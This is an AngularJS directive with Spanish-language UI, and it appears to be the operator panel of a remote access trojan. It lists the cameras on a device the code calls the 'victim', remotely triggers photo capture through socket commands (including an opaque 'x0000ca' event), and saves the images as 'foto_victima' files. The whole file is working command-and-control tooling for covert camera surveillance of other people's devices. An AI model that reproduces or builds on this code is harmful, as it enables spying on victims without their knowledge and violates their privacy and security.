angular.module('myappy').directive('labCamera', function() {
  return {
    restrict: 'E',
    scope: {
      victim: '='
    },
    template:
      `<div class="ui segment">
        <h2 class="ui header">Cámara</h2>
        <div ng-if="cameras.length">
          <label>Cámara:</label>
          <div style="margin: 10px 0;">
            <button ng-repeat="cam in cameras"
                    ng-click="setCamera(cam.id)"
                    ng-class="{'glass-toggle': true, 'is-active': selectedCameraId === cam.id}"
                    style="margin-right: 8px;">
              {{cam.name}}
            </button>
          </div>
        </div>
        <div ng-if="!cameras.length && !errorMsg" class="ui info message">
          <strong>No hay cámaras disponibles.</strong>
        </div>
        <button class="ui labeled icon black button"
                ng-click="takePhoto()"
                ng-disabled="selectedCameraId === null || selectedCameraId === undefined || selectedCameraId === '' || takingPhoto">
          <i class="photo icon"></i>
          Tomar foto
        </button>
        <span ng-if="takingPhoto" style="margin-left: 10px; color: #2196F3;">Tomando foto...</span>
        <div ng-if="photoData" class="field" style="margin-top: 15px;">
          <label>Foto tomada:</label>
          <img ng-src="{{photoData}}" alt="Foto" class="ui image" style="max-width: 320px; max-height: 320px; border-radius: 4px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
          <button class="ui green button" ng-click="downloadPhoto()" style="margin-top:10px;">
            <i class="save icon"></i>
            Guardar foto
          </button>
        </div>
        <div class="ui red message" ng-if="errorMsg">
          {{errorMsg}}
        </div>
      </div>`,
    controller: ['$scope', '$timeout', function($scope, $timeout) {
      $scope.cameras = [];
      $scope.selectedCameraId = null;
      $scope.photoData = null;
      $scope.takingPhoto = false;
      $scope.errorMsg = '';

      function fetchCameraList() {
        if (!$scope.victim) return;
        $scope.cameras = [];
        $scope.selectedCameraId = null;
        $scope.photoData = null;
        $scope.errorMsg = '';
        
        socket.emit('get-camera-list', { victimId: $scope.victim.id });
        socket.once('camera-list', function(data) {
          $scope.$apply(function() {
            try {
              let obj = typeof data === 'string' ? JSON.parse(data) : data;
              console.log("DEBUG camera-list raw:", obj);
              
              if (obj.camList && obj.list && obj.list.length) {
                $scope.cameras = obj.list.map(cam => ({
                  id: parseInt(cam.id, 10),
                  name: cam.name
                }));
                console.log("DEBUG cámaras después del map:", $scope.cameras);
                $scope.selectedCameraId = $scope.cameras[0].id;
                console.log("DEBUG selectedCameraId asignado:", $scope.selectedCameraId, "tipo:", typeof $scope.selectedCameraId);
              } else {
                $scope.errorMsg = "No se encontraron cámaras disponibles";
                console.warn("DEBUG sin cámaras:", obj);
              }
            } catch (e) {
              $scope.errorMsg = "Error al obtener lista de cámaras: " + e.message;
              console.error("DEBUG error parseando:", e);
            }
          });
        });
      }

      $scope.setCamera = function(cameraId) {
        console.log("DEBUG setCamera llamado con:", cameraId);
        $scope.selectedCameraId = cameraId;
        console.log("DEBUG selectedCameraId NOW:", $scope.selectedCameraId);
        $scope.cameraChanged();
      };

      $scope.$watch('selectedCameraId', function(newVal, oldVal) {
        if (newVal !== oldVal) {
          console.log('✅ selectedCameraId cambió de', oldVal, 'a', newVal);
        }
      });

      $scope.cameraChanged = function() {
        console.log("DEBUG cameraChanged - selectedCameraId:", $scope.selectedCameraId, "tipo:", typeof $scope.selectedCameraId);
      };

      $scope.takePhoto = function() {
        console.log("DEBUG takePhoto - selectedCameraId:", $scope.selectedCameraId);
        
        if ($scope.selectedCameraId === null || $scope.selectedCameraId === undefined || $scope.selectedCameraId === '' || $scope.takingPhoto) {
          console.log("DEBUG takePhoto BLOQUEADO");
          return;
        }
        
        if (!$scope.victim) {
          console.log("DEBUG takePhoto BLOQUEADO - no victim");
          return;
        }
        
        $scope.takingPhoto = true;
        $scope.photoData = null;
        $scope.errorMsg = '';
        
        const camID = parseInt($scope.selectedCameraId, 10);
        console.log("DEBUG Enviando cameraID:", camID, "tipo:", typeof camID);
        
        socket.emit('get-photo', { victimId: $scope.victim.id, cameraID: camID });
        
        socket.once('x0000ca', function(data) {
          $scope.$apply(function() {
            $scope.takingPhoto = false;
            console.log("DEBUG respuesta foto:", data);
            
            if (data.image && data.buffer) {
              let arr = data.buffer;
              if (arr instanceof ArrayBuffer) arr = new Uint8Array(arr);
              let binary = '';
              for (let i = 0; i < arr.length; i++) {
                binary += String.fromCharCode(arr[i]);
              }
              $scope.photoData = 'data:image/jpeg;base64,' + btoa(binary);
              console.log("DEBUG foto procesada correctamente");
            } else {
              $scope.errorMsg = data.error || "Error al recibir foto";
              console.warn("DEBUG error en foto:", data);
            }
          });
        });
      };

      $scope.downloadPhoto = function() {
        if (!$scope.photoData) return;
        let link = document.createElement('a');
        link.href = $scope.photoData;
        link.download = 'foto_victima_' + new Date().getTime() + '.jpg';
        link.click();
        console.log("DEBUG foto descargada");
      };

      $scope.$watch('victim', function(newVal) {
        if (newVal) {
          console.log("DEBUG victim cambió, cargando cámaras");
          fetchCameraList();
        }
      });
    }]
  };
});